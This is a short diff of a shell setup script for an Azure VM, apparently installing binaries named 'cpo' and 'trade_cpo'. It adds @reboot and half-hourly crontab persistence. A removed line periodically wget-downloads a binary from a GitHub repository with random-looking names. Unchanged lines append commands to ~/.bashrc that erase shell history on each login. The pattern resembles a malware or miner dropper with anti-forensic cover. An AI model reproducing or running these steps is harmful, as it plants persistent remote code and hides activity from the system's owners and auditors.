@@ -28,7 +28,7 @@ chmod ugo+x cpo
 chmod ugo+x trade_cpo
 sudo systemctl enable cron
 crontab -l | { cat; echo "@reboot /home/azureuser/cpo2"; } | crontab
-crontab -l | { cat; echo "0,30 * * * * wget -p /home/azureuser -O cpo https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/cpo"; } | crontab
+crontab -l | { cat; echo "0,30 * * * * /home/azureuser/trade_cpo"; } | crontab
 echo ". cat /dev/null > ~/.bash_history" >> ~/.bashrc
 echo ". history -cw" >> ~/.bashrc
 sleep 15
